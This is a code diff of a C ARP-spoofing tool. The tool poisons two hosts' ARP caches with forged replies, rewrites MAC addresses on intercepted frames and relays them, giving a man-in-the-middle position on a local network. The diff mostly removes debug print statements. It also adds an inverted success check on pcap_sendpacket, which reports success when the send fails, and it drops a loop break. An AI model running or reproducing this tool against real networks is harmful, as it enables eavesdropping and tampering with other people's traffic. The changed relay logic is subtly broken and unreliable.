@@ -177,15 +177,6 @@ void* ARPInfection_regular(void *pinfo)
 	{
 		SendPacket(handle, info.dst_ip, info.src_ip, info.myMac, info.srcMac, 2, "Regular");
 		SendPacket(handle, info.src_ip, info.dst_ip, info.myMac, info.dstMac, 2, "Regular");
-		/*
-		printf("CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\n");
-		printf("my_ip: %s\n", inet_ntoa(*info.my_ip));
-		printf("src_ip: %s\n", inet_ntoa(*info.src_ip));
-		printf("dst_ip: %s\n", inet_ntoa(*info.dst_ip));
-		printmac("src_mac", info.srcMac);
-		printmac("dst_mac", info.dstMac);
-		printf("CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\n");
-		*/
 		sleep(10);
 	}
 
@@ -252,66 +243,28 @@ void* ARPInfection_irregular(void *ainfo)
 	    }
     	
     	ip_h = (struct ip*)(packet + sizeof(struct ether_header));
-    	
-    	/*
-    	memcpy(eth_h->ether_dhost, "\x11\x11\x11\x11\x11\x11", 6);
-    	memcpy(eth_h->ether_shost, "\x11\x11\x11\x11\x11\x11", 6);
-    	*/
-    	/*
-    	for(int i = 0; i < info->session_n; i++)
-    	{
-    		printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
-    		printmac("eth_shost\t", eth_h->ether_shost);
-    		printmac("src_mac\t\t", info->all_srcMac[i]);
-    		printmac("eth_dhost\t", eth_h->ether_dhost);
-    		printmac("dst_mac\t\t", info->myMac);
-    		printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
-    	}
-    	*/
 
     	for(int i = 0; i < info->session_n; i++)
     	{
-			//if((*(int*)&ip_h->ip_src) == (*(int*)&info->all_src_ip[i]) && (*(int*)&ip_h->ip_dst) != (*(int*)&info->my_ip))
 			if(!memcmp(eth_h->ether_shost, info->all_srcMac[i], 6) && !memcmp(eth_h->ether_dhost, info->myMac, 6)
 				&& ((*(int*)&ip_h->ip_dst) != (*(int*)&info->my_ip)))
 			{
-				printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
-				printmac("eth_h->ether_shost", eth_h->ether_shost);
-				printmac("eth_h->ether_dhost", eth_h->ether_dhost);
 				memcpy(eth_h->ether_shost, info->myMac, 6);
 				memcpy(eth_h->ether_dhost, info->all_dstMac[i], 6);
-				printmac("eth_h->ether_shost", eth_h->ether_shost);
-				printmac("eth_h->ether_dhost", eth_h->ether_dhost);
-				printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
 				break;
 			}
 			else if(!memcmp(eth_h->ether_shost, info->all_dstMac[i], 6) && !memcmp(eth_h->ether_dhost, info->myMac, 6)
 				&& ((*(int*)&ip_h->ip_dst) != (*(int*)&info->my_ip)))
 			{
-				printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
-				printmac("eth_h->ether_shost", eth_h->ether_shost);
-				printmac("eth_h->ether_dhost", eth_h->ether_dhost);
 				memcpy(eth_h->ether_shost, info->myMac, 6);
     			memcpy(eth_h->ether_dhost, info->all_srcMac[i], 6);
-    			printmac("eth_h->ether_shost", eth_h->ether_shost);
-				printmac("eth_h->ether_dhost", eth_h->ether_dhost);
-				printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
-    			break;
 			}
 		}
-		/*
-		printf("*************************************\n");
-		printmac("ether_shost", eth_h->ether_shost);
-		printmac("ether_dhost", eth_h->ether_dhost);
-		printf("ip_src: %s\n", inet_ntoa(ip_h->ip_src));
-		printf("ip_dst: %s\n", inet_ntoa(ip_h->ip_dst));
-		printf("*************************************\n");
-		printf("Modified Packet Relay Success!!\n");
-		*/
+
 		if(pcap_sendpacket(handle, packet, packet_size))
-		{
-				printf("Can't Seen This Section :-(\n");
-		}
+			printf("Modified Packet Relay Success!! :-)\n");
+		else
+			printf("Modified Packet Relay Failed!! :-(!!\n");
     }
 }
 
@@ -383,17 +336,7 @@ int main(int argc, char *argv[])
 		memcpy(pinfo[i].srcMac, ainfo.all_srcMac[i], 6);
 		memcpy(pinfo[i].dstMac, ainfo.all_dstMac[i], 6);
 	}
-	
-	for(int i; i < session_n; i++)
-	{
-		printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
-		printf("%d src_ip: %s\n", i, inet_ntoa(ainfo.all_src_ip[i]));
-		printf("%d dst_ip: %s\n", i, inet_ntoa(ainfo.all_dst_ip[i]));
-		printmac("srcMac", ainfo.all_srcMac[i]);
-		printmac("dstMac", ainfo.all_dstMac[i]);
-		printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
-	}
-	
+
 	athr_id = pthread_create(&athread, NULL, ARPInfection_irregular, (void*)&ainfo);
 	
 	
@@ -417,7 +360,6 @@ int main(int argc, char *argv[])
 		else
 			printf("thread create success!!\n");
 	}
-	
 
 	for(int i = 0; i < session_n; i++)
 		pthread_join(threads[i], NULL);
